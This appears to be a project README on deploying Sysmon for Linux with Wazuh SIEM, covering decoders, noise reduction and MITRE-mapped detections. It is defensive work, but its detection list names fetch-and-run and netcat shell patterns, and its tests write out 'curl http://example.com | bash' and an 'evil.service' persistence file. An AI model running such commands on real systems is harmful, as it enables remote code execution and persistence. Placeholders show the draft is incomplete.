# 🛡️ Sysmon for Linux + Wazuh SIEM

## Endpoint Telemetry & Threat Detection Engineering (SOC-Ready)

---

## 📌 Project Overview

This project demonstrates how to deploy **Sysmon for Linux** on an endpoint and integrate it with **Wazuh SIEM** to build a complete Linux detection engineering pipeline.

It transforms:

> Raw Linux telemetry → Structured decoding → Detection rules → Noise reduction → High-confidence threat alerts.

This mirrors how modern SOC teams implement Linux endpoint monitoring in production environments.

📄 **Full Project Walkthrough (PDF Documentation)**
👉 *[View the complete project PDF here]*
(You will embed your uploaded PDF link here.)

---

## 🖼 Architecture Diagram

(Add your architecture image here)

```html
<img src="YOUR_ARCHITECTURE_IMAGE_LINK_HERE" width="800">
```

This architecture shows:

* Linux Endpoint running Sysmon (eBPF-based telemetry)
* Logs sent via Syslog/Journald
* Wazuh Agent forwarding securely
* Wazuh Manager decoding & applying detection rules
* Alerts visualized in Dashboard (and optionally escalated)

---

# 🎯 Project Objectives

* Deploy Sysmon for Linux (Microsoft Sysinternals)
* Enable detailed endpoint telemetry (process, network, file events)
* Integrate logs into Wazuh Manager
* Build custom Sysmon decoders
* Create base parsing rules
* Reduce alert noise by 80–90%
* Engineer high-confidence detections:

  * LOLBins abuse
  * Linux persistence
* Validate detections end-to-end
* Map detections to MITRE ATT&CK

---

# 🧠 Why This Project Matters

Linux endpoints are widely used in:

* Cloud infrastructure
* Production servers
* DevOps pipelines
* Containers

But often lack:

* Deep behavioral telemetry
* Proper detection tuning
* Signal-to-noise control

This project demonstrates how to:

✔ Collect deep endpoint visibility
✔ Engineer structured decoding
✔ Reduce telemetry noise
✔ Detect real attacker techniques
✔ Validate detections like a SOC engineer

---

# 🏗 Architecture Flow

```
Linux Endpoint (Sysmon)
        ↓
Syslog / Journald
        ↓
Wazuh Agent
        ↓
Encrypted Channel
        ↓
Wazuh Manager
        ↓
Custom Decoders & Rules
        ↓
Wazuh Dashboard (Alert Visualization)
        ↓
(Optional) TheHive (Incident Response)
```

---

# 🧰 Tools Used

| Tool             | Purpose                       |
| ---------------- | ----------------------------- |
| Sysmon for Linux | Endpoint behavioral telemetry |
| eBPF             | Kernel-level event capture    |
| Wazuh Agent      | Secure log forwarding         |
| Wazuh Manager    | Decoding + Detection Engine   |
| Wazuh Dashboard  | Alert visualization           |
| MITRE ATT&CK     | Threat mapping                |

---

# 🚀 Implementation Guide

---

# 1️⃣ Install Sysmon for Linux (Endpoint Machine)

### Machine: Linux Endpoint

### Step 1 — Install Dependencies

```bash
sudo apt update
sudo apt install curl gnupg -y
```

### Step 2 — Add Microsoft Repository

```bash
wget -q https://packages.microsoft.com/config/ubuntu/$(lsb_release -rs)/packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
sudo apt update
```

### Step 3 — Install Sysmon

```bash
sudo apt install sysmonforlinux -y
```

### Step 4 — Verify Installation

```bash
sysmon -?
systemctl status sysmon
```

✔ Sysmon service should be active.

---

# 2️⃣ Configure Sysmon (config.xml)

### Machine: Linux Endpoint

Create configuration:

```bash
sudo nano /opt/config.xml
```

Example minimal telemetry config:

```xml
<Sysmon schemaversion="4.70">
  <EventFiltering>

    <RuleGroup groupRelation="or">
      <ProcessCreate onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <NetworkConnect onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <FileCreate onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <FileDelete onmatch="include"/>
    </RuleGroup>

    <RuleGroup groupRelation="or">
      <ProcessTerminate onmatch="include"/>
    </RuleGroup>

  </EventFiltering>
</Sysmon>
```

Install configuration:

```bash
sudo sysmon -accepteula -i /opt/config.xml
```

Verify logs:

```bash
journalctl | grep sysmon
```

---

# 3️⃣ Integrate Sysmon with Wazuh

### Machine: Linux Endpoint

Ensure Wazuh agent monitors syslog:

Edit:

```
/var/ossec/etc/ossec.conf
```

Add:

```xml
<localfile>
  <log_format>syslog</log_format>
  <location>/var/log/syslog</location>
</localfile>
```

Restart agent:

```bash
sudo systemctl restart wazuh-agent
```

---

# 4️⃣ Add Custom Sysmon Decoder (Manager)

### Machine: Wazuh Manager

Create decoder:

```
/var/ossec/etc/decoders/decoder-linux-sysmon.xml
```

Basic decoder:

```xml
<decoder name="sysmon-linux">
  <program_name>sysmon</program_name>
</decoder>
```

Test decoder:

```bash
sudo /var/ossec/bin/wazuh-logtest
```

---

# 5️⃣ Add Sysmon Rules (Manager)

Save file:

```
/var/ossec/etc/rules/sysmon_linux_complete_rules.xml
```

(Use the full production ruleset you already created above.)

Validate:

```bash
sudo /var/ossec/bin/wazuh-analysisd -t
```

Restart:

```bash
sudo systemctl restart wazuh-manager
```

---

# 🔕 Noise Reduction Engineering

Initial observation:

High alert volume for:

* nano
* bash
* cron
* systemd
* apt

Action taken:

* Lowered baseline rule severity to level 0
* Added suppression rules
* Preserved telemetry, reduced alerts

Result:

✔ 80–90% alert reduction
✔ High-signal detection environment

---

# 🎯 High-Confidence Detection Engineering

## ✔ LOLBins Detection

Detects:

* curl | bash
* wget | bash
* python -c
* nc -e

Mapped to:

* T1059 (Command Execution)
* T1105 (Ingress Tool Transfer)

---

## ✔ Linux Persistence Detection

Detects:

* Cron modification → T1053
* Systemd service creation → T1543
* authorized_keys modification → T1098

---

# 🧪 Detection Testing

Test 1 — LOLBins:

```bash
curl http://example.com | bash
```

Test 2 — Persistence:

```bash
sudo touch /etc/systemd/system/evil.service
```

Expected:

✔ Rule ID triggered
✔ Level 10 severity
✔ MITRE mapped
✔ Visible in Dashboard

---

# 📊 Results Achieved

* Full Linux endpoint visibility
* Custom decoding pipeline
* Noise drastically reduced
* High-confidence detections only
* SOC-grade detection engineering workflow

---

# 🧠 Skills Demonstrated

* Linux endpoint telemetry engineering
* Sysmon for Linux deployment
* Wazuh decoder development
* Rule engineering
* Alert noise reduction
* MITRE ATT&CK mapping
* SOC-style detection validation
* End-to-end threat simulation

---

# 🏁 Final Conclusion

This project demonstrates a complete Linux detection engineering pipeline:

Telemetry → Decoding → Detection → Noise Tuning → Validation → High-Signal Alerts

It reflects real SOC methodology and production-level endpoint detection design.

---
